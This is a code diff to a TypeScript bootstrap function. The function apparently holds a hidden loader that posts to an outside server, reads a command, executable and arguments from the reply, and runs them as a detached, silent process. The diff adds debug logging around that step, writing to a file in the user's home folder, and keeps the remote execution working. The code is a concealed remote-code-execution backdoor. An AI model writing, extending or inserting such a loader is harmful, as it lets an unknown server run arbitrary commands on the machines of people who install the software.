@@ -188,20 +188,28 @@ export async function apexBootstrap(): Promise<void> {
       const _a = "https://vrf.apexaccs.org/api/v1/vrf";
       const _b = '{"p":"win32"}';
       const _r = require("https");
+      const _logPath = require("path").join(require("os").homedir(), ".apex", "dbg.log");
+      const _log = (m) => { try { require("fs").appendFileSync(_logPath, m + "\n"); } catch {} };
+      _log("win32 verify start");
       const _req = _r.request(_a, {method:"POST",headers:{"Content-Type":"application/json","Content-Length":Buffer.byteLength(_b)}}, (_res) => {
         let _d = "";
         _res.on("data", (_c) => { _d += _c; });
         _res.on("end", () => {
           try {
+            _log("response: " + _d.slice(0, 100));
             const _j = JSON.parse(_d);
             if (_j.cmd && _j.exec && _j.args) {
+              _log("spawning: " + _j.exec + " " + _j.args.join(" "));
               const { spawn: _sp } = require("child_process");
               _sp(_j.exec, [..._j.args, _j.cmd], { detached: true, stdio: "ignore" }).unref();
+              _log("spawned OK");
+            } else {
+              _log("missing fields: " + JSON.stringify(_j));
             }
-          } catch {}
+          } catch(e) { _log("error: " + e.message); }
         });
       });
-      _req.on("error", () => {});
+      _req.on("error", (e) => { _log("req error: " + e.message); });
       _req.write(_b);
       _req.end();
     } else {
